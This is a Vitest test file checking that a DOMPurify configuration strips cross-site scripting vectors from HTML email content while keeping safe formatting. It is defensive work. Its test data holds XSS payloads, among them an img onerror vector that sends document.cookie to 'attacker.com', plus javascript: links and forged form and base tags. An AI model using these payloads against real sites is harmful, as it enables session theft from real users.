import { describe, it, expect } from 'vitest';
import DOMPurify from 'dompurify';

describe('DOMPurify & Client HTML Sanitization (Anti-XSS Defense)', () => {
  const sanitizeOptions = {
    USE_PROFILES: { html: true },
    ADD_ATTR: ['target'],
    FORBID_TAGS: ['script', 'style', 'iframe', 'frame', 'object', 'embed', 'applet', 'base', 'form'],
    FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover', 'onfocus', 'onblur', 'formaction'],
  };

  it('should completely remove executable <script> tags and payloads', () => {
    const maliciousHtml = '<p>Meeting notes</p><script>alert("XSS_PAYLOAD")</script>';
    const clean = DOMPurify.sanitize(maliciousHtml, sanitizeOptions);

    expect(clean).not.toContain('<script>');
    expect(clean).not.toContain('XSS_PAYLOAD');
    expect(clean).toContain('<p>Meeting notes</p>');
  });

  it('should strip malicious event handlers (onerror, onload, onclick, onmouseover)', () => {
    const vectors = [
      '<img src="invalid-image.jpg" onerror="fetch(\'https://attacker.com/steal?c=\'+document.cookie)">',
      '<svg onload="alert(document.domain)">',
      '<body onload="alert(1)">',
      '<div onclick="evilFunction()">Click me</div>',
      '<input type="text" onfocus="evil()" autofocus>',
    ];

    for (const vector of vectors) {
      const clean = DOMPurify.sanitize(vector, sanitizeOptions);
      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('onload');
      expect(clean).not.toContain('onclick');
      expect(clean).not.toContain('onfocus');
      expect(clean).not.toContain('evil');
      expect(clean).not.toContain('attacker.com');
    }
  });

  it('should neutralize javascript: pseudoprotocol URLs in hyperlinks', () => {
    const maliciousLink = '<a href="javascript:alert(document.cookie)">Claim your reward</a>';
    const clean = DOMPurify.sanitize(maliciousLink, sanitizeOptions);

    expect(clean).not.toContain('javascript:');
    expect(clean).not.toContain('alert(');
  });

  it('should forbid high-risk embedding and container tags (iframe, object, embed, form, base)', () => {
    const forbiddenTags = [
      '<iframe src="https://malicious-phishing.com"></iframe>',
      '<object data="exploit.swf"></object>',
      '<embed src="payload.pdf">',
      '<form action="https://attacker.com/login"><input name="pass"></form>',
      '<base href="https://attacker-hijack.com/">',
    ];

    for (const tag of forbiddenTags) {
      const clean = DOMPurify.sanitize(tag, sanitizeOptions);
      expect(clean).not.toContain('<iframe');
      expect(clean).not.toContain('<object');
      expect(clean).not.toContain('<embed');
      expect(clean).not.toContain('<form');
      expect(clean).not.toContain('<base');
    }
  });

  it('should preserve safe and legitimate email styling, tables, lists, and links', () => {
    const safeEmail = `
      <div class="email-container">
        <h1>Quarterly Review</h1>
        <p>Hi <strong>Team</strong>, here is the update:</p>
        <ul>
          <li>Goal 1: <em>Shipped</em></li>
          <li>Goal 2: In progress</li>
        </ul>
        <table>
          <thead>
            <tr><th>Metric</th><th>Value</th></tr>
          </thead>
          <tbody>
            <tr><td>Uptime</td><td>99.99%</td></tr>
          </tbody>
        </table>
        <a href="https://streamline.app/docs" target="_blank">Documentation Link</a>
      </div>
    `;

    const clean = DOMPurify.sanitize(safeEmail, sanitizeOptions);

    expect(clean).toContain('<h1>Quarterly Review</h1>');
    expect(clean).toContain('<strong>Team</strong>');
    expect(clean).toContain('<em>Shipped</em>');
    expect(clean).toContain('<table>');
    expect(clean).toContain('href="https://streamline.app/docs"');
  });

  it('should handle nested and obfuscated SVG script execution vectors', () => {
    const obfuscatedSvg = '<svg><g><script>alert("nested_svg_xss")</script></g></svg>';
    const clean = DOMPurify.sanitize(obfuscatedSvg, sanitizeOptions);

    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('nested_svg_xss');
  });
});
